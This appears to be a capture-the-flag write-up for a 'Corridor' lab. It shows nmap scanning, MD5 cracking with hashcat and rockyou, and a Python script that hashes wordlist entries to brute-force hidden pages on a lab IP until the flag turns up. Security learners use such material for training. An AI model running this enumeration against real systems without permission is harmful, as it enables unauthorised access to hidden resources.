# Corridor

Firstly, I always **nmap** to see what services are up on the target IP, the only one up was http:

<img width="187" height="39" alt="image" src="https://github.com/user-attachments/assets/aea1df1b-917e-477d-a89d-5420c82397c8" />

When we get to the website, it's a corridor with clickable doors leading to rooms. If we view the source code we get around 12 of them

<img width="1583" height="232" alt="image" src="https://github.com/user-attachments/assets/d249e536-6ef8-4112-9cb7-05f1e1639828" />

I opened up each of the rooms and viewed the source code for each. All of them were empty_room.jpg, so nothing overtly hidden.

The description of the challenge mentions that the website values are hexadecimal which look an awful lot like an hash

I then stored all the hashes in a text file and ran a simple hashcat command to see if it was going to be as simple as MD5:

`hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt`

-m 0: MD5

-a 0: Attack mode Straight

```
c4ca4238a0b923820dcc509a6f75849b:1
c81e728d9d4c2f636f067f89cc14862c:2
eccbc87e4b5ce2fe28308fd9f2a7baf3:3
a87ff679a2f3e71d9181a67b7542122c:4
e4da3b7fbbce2345d7772b0674a318d5:5
1679091c5a880faf6fb5e6087eb1b2dc:6
8f14e45fceea167a5a36dedd4bea2543:7
c9f0f895fb98ab9159f51fd0297e236d:8
45c48cce2e2d7fbdea1afc51c7c6ad26:9
d3d9446802a44259755d38e6d163e820:10
6512bd43d9caa6e02c990b0a82652dca:11
c20ad4d76fe97759aa27a0c99bff6710:12
c51ce410c124a10e0db5e4b97fc2af39:13
```

So we can determine that the http references are just numbers. After seeing this, I then decided to go the opposite way of 
where I needed to go, and I started counting up from 13 to see if any numbers between 1-1000 were applicable. 
I also tried to hash directory paths such as `etc/passwd` to see if that would work, which it didn't.
Eventually, I created a script that would read out the contents of a file line by line and MD5 hash it to see if anything from Seclists's common Web-Content list would work.

```
import hashlib
import requests
from concurrent.futures import ThreadPoolExecutor
import signal
import sys

base_url = "http://10.64.188.71/"
wordlist = "/home/kali/Desktop/SecLists/Discovery/Web-Content/common.txt"

running = True

def signal_handler(sig, frame):
    global running
    print("\n[!] Stopping...")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def check(word):
    if not running:
        return

    word = word.strip()
    if not word:
        return

    md5_hash = hashlib.md5(word.encode()).hexdigest()
    url = base_url + md5_hash

    try:
        r = requests.get(url, timeout=2)

        if r.status_code == 200 and len(r.text) > 50:
            print(f"[+] {word} -> {url}", flush=True)

    except requests.exceptions.RequestException:
        pass


with open(wordlist, "r", encoding="latin-1") as f:
    words = f.readlines()

with ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(check, words)
```

Using this, I was able to obtain 14 valid directories from the wordlist `/home/kali/Desktop/SecLists/Discovery/Web-Content/common.txt`

```
[+] 0 -> http://10.64.188.71/cfcd208495d565ef66e7dff9f98764da
[+] 1 -> http://10.64.188.71/c4ca4238a0b923820dcc509a6f75849b
[+] 10 -> http://10.64.188.71/d3d9446802a44259755d38e6d163e820
[+] 11 -> http://10.64.188.71/6512bd43d9caa6e02c990b0a82652dca
[+] 12 -> http://10.64.188.71/c20ad4d76fe97759aa27a0c99bff6710
[+] 13 -> http://10.64.188.71/c51ce410c124a10e0db5e4b97fc2af39
[+] 2 -> http://10.64.188.71/c81e728d9d4c2f636f067f89cc14862c
[+] 3 -> http://10.64.188.71/eccbc87e4b5ce2fe28308fd9f2a7baf3
[+] 4 -> http://10.64.188.71/a87ff679a2f3e71d9181a67b7542122c
[+] 7 -> http://10.64.188.71/8f14e45fceea167a5a36dedd4bea2543
[+] 8 -> http://10.64.188.71/c9f0f895fb98ab9159f51fd0297e236d
[+] 9 -> http://10.64.188.71/45c48cce2e2d7fbdea1afc51c7c6ad26
[+] 6 -> http://10.64.188.71/1679091c5a880faf6fb5e6087eb1b2dc
[+] 5 -> http://10.64.188.71/e4da3b7fbbce2345d7772b0674a318d5
```

And at the top there, we can see, 0 is a valid file (which I should have checked with a simple md5sum `echo -n "0" | md5sum`), but that got me the flag.
